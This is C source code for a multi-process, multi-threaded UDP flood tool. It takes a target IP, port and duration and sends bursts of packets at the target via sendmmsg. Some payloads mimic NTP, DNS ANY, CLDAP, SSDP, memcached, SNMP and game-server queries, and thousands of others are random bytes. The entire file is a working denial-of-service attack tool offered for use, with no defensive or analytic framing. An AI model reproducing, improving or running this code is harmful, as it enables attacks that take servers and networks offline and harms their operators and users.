#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/wait.h>

#define MAX_PACKET_SIZE 1472
#define MAX_THREADS 256
#define MAX_BURST 1024
#define MAX_PAYLOADS 10000
#define MAX_PROCESSES 8

typedef struct {
    char ip_target[64];
    int port;
    int duration;
    int packet_size;
    int threads;
    int burst_size;
} config_t;

typedef struct {
    config_t *cfg;
    int thread_id;
} thread_arg_t;

char payloads[MAX_PAYLOADS][MAX_PACKET_SIZE];
int payload_lens[MAX_PAYLOADS];
int total_payloads = 0;

void add_payload(const unsigned char *data, int len) {
    if (total_payloads >= MAX_PAYLOADS || len > MAX_PACKET_SIZE) return;
    memcpy(payloads[total_payloads], data, len);
    payload_lens[total_payloads] = len;
    total_payloads++;
}

void generate_payloads() {
    srand(time(NULL));

    const unsigned char mc_ping[] = "\xFE\x01";
    add_payload(mc_ping, sizeof(mc_ping)-1);

    const unsigned char valve_ping[] = "\xFF\xFF\xFF\xFFTSource Engine Query";
    add_payload(valve_ping, sizeof(valve_ping)-1);

    const unsigned char ntp_amp[] = "\x17\x00\x03\x2a\x00\x00\x00\x00";
    add_payload(ntp_amp, sizeof(ntp_amp));

    const unsigned char dns_flood[] = "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01";
    add_payload(dns_flood, sizeof(dns_flood)-1);

    const unsigned char cldap[] = "\x30\x84\x00\x00\x00\x29\x02\x01\x01\x63\x84\x00\x00\x00\x22\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\xa0\x84\x00\x00\x00\x0c\x30\x84\x00\x00\x00\x08\x04\x00\x04\x00\x04\x00\x04\x00";
    add_payload(cldap, sizeof(cldap)-1);

    const unsigned char ssdp[] = "M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nMAN:\"ssdp:discover\"\r\nST:ssdp:all\r\nMX:2\r\n\r\n";
    add_payload(ssdp, sizeof(ssdp)-1);

    const unsigned char http_probe[] = "GET /cdn-cgi/trace HTTP/1.1\r\nHost: example.com\r\n\r\n";
    add_payload(http_probe, sizeof(http_probe)-1);

    const unsigned char dns_any[] = "\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06govdot\x03com\x00\x00\xFF\x00\x01";
    add_payload(dns_any, sizeof(dns_any)-1);

    const unsigned char mDNS[] = "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0C\x00\x01";
    add_payload(mDNS, sizeof(mDNS)-1);

    const unsigned char q3status[] = "\xFF\xFF\xFF\xFFgetstatus";
    add_payload(q3status, sizeof(q3status)-1);

    const unsigned char memcached[] = "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    add_payload(memcached, sizeof(memcached)-1);

    const unsigned char chargen[] = "\x00";
    add_payload(chargen, sizeof(chargen));

    const unsigned char snmp[] = "\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04\x71\xb6\xe1\x0d\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00";
    add_payload(snmp, sizeof(snmp)-1);

    for (int i = 0; i < MAX_PAYLOADS - 20; i++) {
        int len = 200 + rand() % (MAX_PACKET_SIZE - 200);
        for (int j = 0; j < len; j++) {
            payloads[total_payloads][j] = rand() % 256;
        }
        payload_lens[total_payloads] = len;
        total_payloads++;
    }
}

void bind_core(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
}

void* flood_thread(void *arg) {
    thread_arg_t *thread = (thread_arg_t *)arg;
    config_t *cfg = thread->cfg;

    bind_core(thread->thread_id);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;

    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse));

    struct sockaddr_in local;
    local.sin_family = AF_INET;
    local.sin_addr.s_addr = INADDR_ANY;
    local.sin_port = htons(rand() % 65535);
    bind(sock, (struct sockaddr*)&local, sizeof(local));

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(cfg->port);
    inet_pton(AF_INET, cfg->ip_target, &target.sin_addr);

    char sendbuf[MAX_BURST][MAX_PACKET_SIZE];
    struct iovec iov[MAX_BURST];
    struct mmsghdr msgs[MAX_BURST];

    time_t end_time = time(NULL) + cfg->duration;

    while (time(NULL) < end_time) {
        for (int i = 0; i < cfg->burst_size; i++) {
            int idx = rand() % total_payloads;
            int len = payload_lens[idx];
            if (len > cfg->packet_size) len = cfg->packet_size;
            memcpy(sendbuf[i], payloads[idx], len);

            iov[i].iov_base = sendbuf[i];
            iov[i].iov_len = len;

            msgs[i].msg_hdr.msg_name = &target;
            msgs[i].msg_hdr.msg_namelen = sizeof(target);
            msgs[i].msg_hdr.msg_iov = &iov[i];
            msgs[i].msg_hdr.msg_iovlen = 1;
            msgs[i].msg_hdr.msg_control = NULL;
            msgs[i].msg_hdr.msg_controllen = 0;
            msgs[i].msg_hdr.msg_flags = 0;
        }

        sendmmsg(sock, msgs, cfg->burst_size, 0);
        usleep(rand() % 1000);
    }

    close(sock);
    return NULL;
}

void run_flood(config_t *cfg) {
    pthread_t tid[MAX_THREADS];
    thread_arg_t args[MAX_THREADS];

    for (int i = 0; i < cfg->threads; i++) {
        args[i].cfg = cfg;
        args[i].thread_id = i;
        pthread_create(&tid[i], NULL, flood_thread, &args[i]);
    }

    for (int i = 0; i < cfg->threads; i++) {
        pthread_join(tid[i], NULL);
    }
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <ip> <port> <duration> [packet_size=1472] [burst=1024]\n", argv[0]);
        return 1;
    }

    config_t cfg;
    memset(&cfg, 0, sizeof(cfg));
    strncpy(cfg.ip_target, argv[1], sizeof(cfg.ip_target)-1);
    cfg.port = atoi(argv[2]);
    cfg.duration = atoi(argv[3]);
    cfg.packet_size = (argc >= 5) ? atoi(argv[4]) : MAX_PACKET_SIZE;
    cfg.burst_size = (argc >= 6) ? atoi(argv[5]) : MAX_BURST;
    cfg.threads = sysconf(_SC_NPROCESSORS_ONLN);
    if (cfg.threads > MAX_THREADS) cfg.threads = MAX_THREADS;

    printf("Preparing payloads...\n");
    generate_payloads();

    for (int i = 0; i < MAX_PROCESSES; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            run_flood(&cfg);
            exit(0);
        }
    }

    for (int i = 0; i < MAX_PROCESSES; i++) wait(NULL);

    printf("Flood complete.\n");
    return 0;
}
